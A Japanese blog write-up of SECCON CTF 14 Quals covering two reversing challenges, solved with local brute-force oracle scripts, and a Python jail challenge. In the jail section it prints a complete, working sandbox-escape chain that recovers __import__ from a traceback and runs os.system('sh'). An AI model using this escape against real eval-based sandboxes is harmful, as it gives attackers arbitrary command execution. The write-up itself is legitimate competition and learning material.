---
title: "[CTF] SECCON CTF 14 Quals writeup"
date: 2025-12-17T16:53:24+09:00
description: "SECCON CTF 14 QualsにTSGのrev要員として参加しました。"
keyword: "ctf,seccon,seccon 14,quals,writeup"
author: "caphosra"
tags: ["CTF"]
draft: false
---

SECCON CTF 14 Qualsに参加したのでwriteupを書く。

チームはTSGで参加して、結果は国内7位だった。TSGは(これから何かをしでかさない限り)SECCON本選への出場権を獲得できたことになる。

個人としては、revを2問(Ez Flag Check, aeppel), jailを1問(excepython)を解いた。

## rev: Ez Flag Check (59pt)

一番解かれていたrev問題。

ELFファイルが与えられ、そのELFが受け入れるようなflagを見つけるというよくあるタイプの問題だった。Ghidraで覗いてあげると、バイナリは、フラグの長さとフラグが`SECCON{****}`の形式を守っていることを確認した上で、フラグを`sigma_encrypt`なる関数に通してからエンコードされたバイト列と比較していることがわかる。

`sigma_encrypt`関数を見てあげると、ハードコーディングされた値を使って計算された`key_bytes`とフラグの一部`message`をXORして比較用のバイト列`out`を生成していることがわかる。
```c
for (i_1 = 0; i_1 < len; i_1 = i_1 + 1) {
    out[i_1] = message[i_1] ^ key_bytes[(uint)i_1 & 0xf] + (char)i_1;
}
```
各文字が1文字づつ他の文字と独立に決定していっている様子がわかるので、バイナリをオラクルとしてprintableな文字`x`について`SECCON{xxx.....x}`を総当たりしていけば、printableの文字の種類回だけのイテレーションでフラグが得られる。もちろんこれよりいくらでも効率的な方法はあるが、別に裏でスクリプトを動かして置くだけなのでこれで十分だった。

```python
#!/usr/bin/python3

import sys
from ptrlib import *
import time
import re
import string

import subprocess

def get_list(flag):
    assert len(flag) == 0x12

    EXEC = "./chall"

    sock = Process(EXEC)

    time.sleep(0.5)

    p = subprocess.Popen(["gdb", "-x", "./gs.py", "./chall"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    time.sleep(0.5)

    sock.sendline("SECCON{" + flag +"}")

    time.sleep(0.5)
    sock.close()

    out, err = p.communicate()
    out = out.decode()
    out = out.replace("\n", "")
    matched = re.findall(r"\$1\s=\s\{(.+)\}", out)[0].split(", ")

    b = []
    for x in matched:
        b.append(int(x, 16))
    return b

flag = list(" "*0x12)

ENC = [0x03, 0x15, 0x13, 0x03, 0x11, 0x55, 0x1f,0x43, 0x63,0x61,0x59,0xef,0xbc,0x10,0x1f,0x43,0x54,0xa8]

for x in string.ascii_letters + string.digits + string.punctuation:
    out = get_list(x*0x12)
    for i in range(0x12):
        if out[i] == ENC[i]:
            flag[i] = x
            print(flag)

print(flag)
```

`SECCON{flagc29yYW5k<b19!!}`

## rev: aeppel (101pt)

まさかのAppleScript問題。お主生きていたのか。

コンパイル済みのAppleScriptバイナリが与えられるので、正しい入力を入れないといけないという問題。実はラップトップがMacBookなので[^1]ローカルで実行することができた。CTFでMacBookであることが有利(?)に働いたことはこれが初めてかもしれない。

{{< figure src="/images/2025-12-17/osa-dialog.png" alt="AppleScriptバイナリの実行様子" caption="AppleScriptバイナリの実行様子" >}}

AppleScriptのバイナリにはソースコードが含まれている場合があるようで、その場合は`osadecompile`で元に戻せるそうだが、もちろんこのバイナリにおいてはそのようなことはなかった。

ではどうするのか。ググるとどうやら野良のソフト[AppleScript disassembler](https://github.com/Jinmo/applescript-disassembler)を使えばバイナリを逆アセンブルすることができるようだ。実際にこのバイナリに対して使おうとするとエラーが出たので、当該部のツールのソースコードをコメントアウトして動かしてあげると、一部だけ逆アセンブルが成功した。

```
=== data offset 2 ===
Function name : <Value type=object value=<Value type=event_identifier value=b'aevt'-b'oapp'-b'null'-b'\x00\x00\x80\x00'-b'****'-b'\x00\x00\x90\x00'>>
Function arguments:  <empty or unknown>
 00000 PushLiteral 0 # None
 00001 Push0
 00002 MessageSend 1 # <Value type=object value=<Value type=event_identifier value=b'syso'-b'dsct'-b'****'-b'\x00\x00\x00\x00'-b'scpt'-b'\x00\x00\x00\x00'>>
 00005 GetData
 00006 PopGlobal b'res'
 00007 StoreResult
 00008 PushGlobal b'res'
 00009 Return
 0000a Return
=== data offset 3 ===
<not a function>
```

あまりにも情報がない。ところで、バイナリエディタを眺めると、FasdUAS 1.101.10という文字列が先頭にみえる。そこから先に目を向けるとFasdUAS 1.101.10という文字列がみえる。先ほどの逆アセンブル結果が妙に短かったことも含めて考えると、バイナリの内部にAppleScriptが埋め込まれているのではないか、という推察した。

{{< figure src="/images/2025-12-17/osa-bin.png" alt="AppleScriptバイナリを眺めた様子 入れ子になっていそうなことがわかる" caption="AppleScriptバイナリを眺めた様子" >}}

この部分を取り出して先ほどのdisassemblerにかけてみると、今度はかなりまともな逆アセンブル結果が得られた。

```applescript
...
=== data offset 14 ===
Function name : <Value type=object value=<Value type=event_identifier value=b'aevt'-b'oapp'-b'null'-b'\x00\x00\x80\x00'-b'****'-b'\x00\x00\x90\x00'>>
Function arguments:  <empty or unknown>
 00000 PushLiteral 0 # [<Value type=special value=nil>, <Value type=string value=b'\x00E\x00n\x00t\x00e\x00r\x00 \x00t\x00h\x00e\x00 \x00f\x00l\x00a\x00g'>]
 00001 PushLiteral 1 # <Value type=object value=<Value type=constant value=0x64747874>>
 00002 PushLiteral 2 # [<Value type=special value=nil>, <Value type=string value=b''>]
 00003 PushLiteral 3 # <Value type=object value=<Value type=constant value=0x62746e73>>
 00004 PushLiteral 4 # [<Value type=special value=nil>, <Value type=string value=b'\x00O\x00K'>]
 00005 Push1
 00006 MakeVector
 00007 PushLiteral 5 # <Value type=object value=<Value type=constant value=0x64666c74>>
 00008 Push1
 00009 PushLiteral 6 # <Value type=fixnum value=0x6>
 0000a MessageSend 7 # <Value type=object value=<Value type=event_identifier value=b'syso'-b'dlog'-b'askr'-b'\x00\x00\x00\x00'-b'TEXT'-b'\x00\x00\x00\x00'>>
 0000d PushLiteral 8 # <Value type=object value=<Value type=constant value=0x74747874>>
 0000e MakeObjectAlias 21 # GetProperty

 0000f GetData
 00010 PopGlobal b'oregon'
 00011 StoreResult
...
```

結果として特殊なアセンブリのようなものが得られた。ここから先ほどのdisassemblerを調べている時に見つけた[aevt\_decompile](https://github.com/SentineLabs/aevt_decompile)なる、この出力をより見やすくしてくれるものを使うと、上の命令列に少しだけ注釈がついた。

が、注釈が付いたとはいえ、この調子で知らない命令が1000行近く続くのだから解析は大変だ。そこで、折角なのでChatGPTにこの命令列をPython風の疑似コードに変換するように頼んだ。するとChatGPTはその先を行って、AppleScriptのバイナリをオラクルとしてFLAGを求めるPythonコードまで生成してくれた。思わずAI驚き屋になってしまった瞬間である。

流石に生成してもらったPythonコードはそのままでは動かなかったが、型エラーやバイナリの呼び出しに使うAppleScriptの構文を修正したらFLAGを得ることができた。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import argparse
import itertools
import re
import string
import subprocess
from pathlib import Path
from typing import List, Sequence, Tuple, Optional


# From your reversing result:
# Shimbashi is called with (washingtondc, colorado, idaho, kansas)
# where washingtondc == { inner }, colorado=6856, idaho=6843, kansas=13
COLORADO = 13
IDAHO = 6843
KANSAS = 6856

# From your reversing result (target vector)
TARGET = [114, 131, 127, 125, 120, 130, 116, 133, 120, 129, 135, 117, 134, 129, 75, 68]
CHECKSUM_TARGET = 0x5F  # Ginza(inner) must equal 0x5f
PREFIX = "SECCON{"
SUFFIX = "}"


def esc_applescript_str(s: str) -> str:
    """Escape for AppleScript string literal inside double-quotes."""
    return s.replace("\\", "\\\\").replace('"', '\\"')


def run_osascript(wrapper: str) -> str:
    """Run osascript -e wrapper and return stdout stripped. Raise with stderr context on failure."""
    try:
        out = subprocess.check_output(["osascript", "-e", wrapper], text=True, stderr=subprocess.STDOUT)
        return out.strip()
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"osascript failed (exit={e.returncode}). Output:\n{e.output}") from e


def parse_numbers(text: str) -> List[int]:
    """
    Parse any AppleScript list-ish text like:
      "{114, 131, ...}" or "{{114, 131, ...}}" or "114" etc.
    Returns all integers found, in order.
    """
    nums = re.findall(r"-?\d+", text)
    return [int(x) for x in nums]


class Oracle:
    def __init__(self, scpt_path: Path):
        self.scpt_path = scpt_path.resolve()

    def _base_wrapper(self) -> str:
        # Using only "scripting additions" (no AppleScriptObjC) to avoid ":" selector parse issues.
        return f'''
use scripting additions
set s to load script (POSIX file "{esc_applescript_str(str(self.scpt_path))}")
'''

    def shimbashi_text(self, inner: str) -> str:
        w = self._base_wrapper() + f'''
set inner to "{esc_applescript_str(inner)}"
set washingtondc to {{inner}}
set colorado to {COLORADO}
set idaho to {IDAHO}
set kansas to {KANSAS}
set out to (s's Shimbashi(washingtondc, colorado, idaho, kansas))

set flat to {{}}
repeat with x in out
    if class of x is list then
        repeat with y in x
            set end of flat to (y as integer)
        end repeat
    else
        set end of flat to (x as integer)
    end if
end repeat

set AppleScript's text item delimiters to ","
set txt to flat as text
set AppleScript's text item delimiters to ""
return txt
'''
        return run_osascript(w)

    def shimbashi_vec(self, inner: str) -> List[int]:
        txt = self.shimbashi_text(inner)
        nums = parse_numbers(txt)

        # We expect at least 16 numbers somewhere in the output
        if len(nums) < 16:
            raise ValueError(f"Unexpected Shimbashi output (len={len(nums)}): {txt!r}")

        # Many formats exist; most useful is the first 17 numbers.
        # If your output contains extra numbers, we still take the first 17.
        return nums[:17]

    def ginza(self, inner: str) -> int:
        w = self._base_wrapper() + f'''
set inner to "{esc_applescript_str(inner)}"
set out to (s's Ginza(inner))
return out as text
'''
        txt = run_osascript(w)
        nums = parse_numbers(txt)
        if not nums:
            raise ValueError(f"Unexpected Ginza output: {txt!r}")
        return int(nums[0])

    def iidabashi(self, flag: str) -> bool:
        w = self._base_wrapper() + f'''
set cand to "{esc_applescript_str(flag)}"
set out to (s's Iidabashi(cand))
return out as text
'''
        txt = run_osascript(w).strip().lower()
        # AppleScript prints "true"/"false"
        if "true" in txt:
            return True
        if "false" in txt:
            return False
        # Fallback: parse as number
        nums = parse_numbers(txt)
        if nums:
            return bool(nums[0])
        raise ValueError(f"Unexpected Iidabashi output: {txt!r}")


def recover_by_position(oracle: Oracle, charset: str, filler: str = "A") -> Tuple[str, List[List[str]]]:
    """
    Probe per position:
    - keep 16-char inner string, vary one position, observe Shimbashi output at that position
    - collect which chars yield TARGET byte at position i
    Returns:
        best_guess (using singletons where possible, else filler)
        candidates_per_pos: list of list[str]
    """
    if len(filler) != 1:
        raise ValueError("filler must be a single character")

    known = [filler] * 16
    candidates_per_pos: List[List[str]] = []

    # Warmup (also validates that handler call works)
    base_vec = oracle.shimbashi_vec("".join(known))
    if len(base_vec) != 16:
        raise ValueError("Shimbashi vector not length 16 (unexpected)")

    for i in range(16):
        hits: List[str] = []
        for ch in charset:
            test = known.copy()
            test[i] = ch
            vec = oracle.shimbashi_vec("".join(test))
            if vec[i] == TARGET[i]:
                hits.append(ch)
        candidates_per_pos.append(hits)
        if len(hits) == 1:
            known[i] = hits[0]

        print(f"[pos {i:02d}] hits={len(hits)} example={hits[:10]}")

    return "".join(known), candidates_per_pos


def finalize(oracle: Oracle, candidates_per_pos: Sequence[Sequence[str]]) -> Optional[str]:
    """
    Brute force over remaining candidate sets (should be small) using Ginza and Iidabashi constraints.
    """
    # If any position has 0 candidates, cannot finalize.
    if any(len(c) == 0 for c in candidates_per_pos):
        return None

    for tup in itertools.product(*candidates_per_pos):
        inner = "".join(tup)
        if oracle.ginza(inner) != CHECKSUM_TARGET:
            continue
        flag = f"{PREFIX}{inner}{SUFFIX}"
        if oracle.iidabashi(flag):
            return flag
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--scpt", default="dump.scpt", help="Path to compiled AppleScript (.scpt)")
    ap.add_argument("--smoke", action="store_true", help="Run smoke tests (Shimbashi/Ginza)")
    ap.add_argument("--probe", action="store_true", help="Run per-position probing against TARGET")
    ap.add_argument("--charset", default="lower+upper+digit+_-", help="Charset preset or literal")
    ap.add_argument("--try-flag", default=None, help="Test a specific flag with Iidabashi")
    args = ap.parse_args()

    scpt_path = Path(args.scpt)
    if not scpt_path.exists():
        raise SystemExit(f"dump.scpt not found: {scpt_path}")

    oracle = Oracle(scpt_path)

    def resolve_charset(spec: str) -> str:
        presets = {
            "lower+digit": string.ascii_lowercase + string.digits,
            "lower+upper+digit": string.ascii_lowercase + string.ascii_uppercase + string.digits,
            "lower+upper+digit+_-": string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-",
            "printable": "".join(ch for ch in string.printable if ch not in "\r\n\t\x0b\x0c"),
        }
        return presets.get(spec, spec)

    if args.try_flag:
        ok = oracle.iidabashi(args.try_flag)
        print(f"Iidabashi({args.try_flag!r}) -> {ok}")
        return

    if args.smoke:
        inner = "A" * 16
        print("[smoke] Shimbashi(A*16) text:", oracle.shimbashi_text(inner))
        print("[smoke] Shimbashi(A*16) vec :", oracle.shimbashi_vec(inner))
        print("[smoke] Ginza(A*16)        :", oracle.ginza(inner))
        return

    if args.probe:
        cs = resolve_charset(args.charset)
        guess, cands = recover_by_position(oracle, cs, filler="A")
        print("[probe] best guess (singletons applied):", guess)
        flag_guess = f"{PREFIX}{guess}{SUFFIX}"
        print("[probe] flag guess:", flag_guess)

        # Attempt finalize (only feasible if candidate sets are small)
        total = 1
        for c in cands:
            total *= max(1, len(c))
        print("[probe] total combinations to finalize:", total)

        if total <= 5_000_000:  # safety bound
            ans = finalize(oracle, cands)
            print("[finalize] result:", ans)
        else:
            print("[finalize] skipped (too many combos). Try narrowing charset or improve constraints.")
        return

    ap.print_help()


if __name__ == "__main__":
    main()
```

`SECCON{applescriptfun<3}`

## jail: excepython (118pt)

いわゆるPyJail問。

問題は非常にシンプルで、以下の通りである。
```python
#!/usr/local/bin/python3
ex = None
while (code := input("jail> ")) and all(code.count(c) <= 1 for c in ".,(+)"):
    try:
        test = eval(code, {"__builtins__": {}, "ex": ex})
    except Exception as e:
        ex = e
```

一切環境に組み込み関数がなく、1文に入れられる`.`, `,`, `(`, `+`, `)`はそれぞれ1回まで。また、変数は次の文に持ち越せず、最後に起こした例外`ex`のみが次の文に持ち越せる。この環境で`/flag-*.txt`を読み出す必要がある。

まず、`()`が制約されていることから、普通に行う関数呼び出しは1文で1回までである。また、`.`も1回までなので、
```python
ex.__traceback__.tb_frame.f_builtins["__import__"]("os").system("sh")
```
のように、組み込み関数が一切使えない環境でshellを起動するための常套手段であるところの、チェーンを伸ばす行為もできない。

基本方針としては、先述のように`__traceback__`からメンバーを辿っていってshellを起動したい。ただし、`.`が1回しか使えないので、1文で辿れるのは1段階だけである。変数は使えないので、なんとかして例外を使って次の文に値を持ち越したい。

ここで使えるのが`KeyError`である。`KeyError`は辞書型の値に対して存在しないキーでアクセスした時に発生する例外である。この例外を使えば、以下のように`args[0]`にアクセスすることで、値を次の文に持ち越すことができる。ちなみにこの`KeyError`の`args[0]`のテクニックはChatGPTに教えてもらった。
```python
try:
    # 空の辞書にはobjがキーとなる値が存在しない
    {}[obj]
except KeyError as ex:
    # ex.args[0]にobjが入る
    assert ex.args[0] == obj
```

なお、持ち出せる値は`KeyError`の制約からhashableなものだけなので、listやdictは持ち出せない。

これで値を持ち越せるようになったが、`ex.args[0]`は`.`を含むので、`.`を使わずにメンバーを辿っていく必要がある。ここで使うのが`__getattribute__`である。`obj.__getattribute__("member")`は`obj.member`と同じ意味になるのでメンバーへのアクセスを関数呼び出しに置き換えることができる。一見`.`を含んでしまっているので本末転倒のように思えるかもしれない。しかし、この関数呼び出しをlambda式に閉じ込めておけば、`.`を使うのは最初の定義の時だけで済む。つまり、

```python
{}[lambda x:x[0].__getattribute__(x[1])]
```
とすれば良い。

あとは、`ex.args[0]`が1文に複数出現してしまうと`.`の使用数の制限をオーバーしてしまうので`:=`を使って一度変数にバインドしてしまうこと、持ち出したい値をtupleにまとめてしまうこと[^2]、先ほどのメンバーへのアクセスを行う関数の引数に要素数2の配列を渡すために`+`を使うこと[^3]などの工夫を行えば、先ほどのチェーンは以下のように書き換えられる。

```python
1/0
{}[lambda x:x[0].__getattribute__(x[1])]
{}[a:=ex.args[0],a([ex]+["__traceback__"])]
{}[a:=ex.args[0],a[0]([a[1]]+["tb_frame"])]
{}[a:=ex.args[0],a[0][0]([a[1]]+["f_builtins"])["__import__"]]
{}[a:=ex.args[0],a[1]("os")]
{}[a:=ex.args[0],a[0][0][0][0]([a[1]]+["system"])]
{}[a:=ex.args[0],a[1]("sh")]
```

再掲: 元のチェーン
```python
ex.__traceback__.tb_frame.f_builtins["__import__"]("os").system("sh")
```

`SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}`

参考: https://shirajuki.js.org/blog/pyjail-cheatsheet/

### 余談: 解けた問題以外の話

broken-jsonに無限に時間を溶かし、broken-jsonが解かれたあとはkernel問のtinyfsに時間を溶かした。無計画にスレッドをたてまくってrace conditionを狙うんじゃなく、せめて`userfaultfd`とかを使うべきだった。あまりにも反省点が多い。

## おわりに

excepythonが頭の体操として面白かった。今回のCTFは前回よりも意識的にLLMを使うようにしたが、個人的に使いこなせている感覚があまりなかったので、引き続き上手く付き合っていく方法を模索していきたい。

SECCONの運営の方々、面白い問題をありがとうございました。

[^1]: とはいえ、自宅のPCのkali環境にSSHしてるのでMacBookであることによる恩恵はほとんどない。
[^2]: 先述の通り、持ち出せるのはhashableなものだけなので、listではなくtupleにする必要がある。
[^3]: Tupleを構成するために「貴重な」`,`を消費してしまっているので、`[a,b]`のような書き方はできない。そのため、`[a]+[b]`のようにする必要がある。
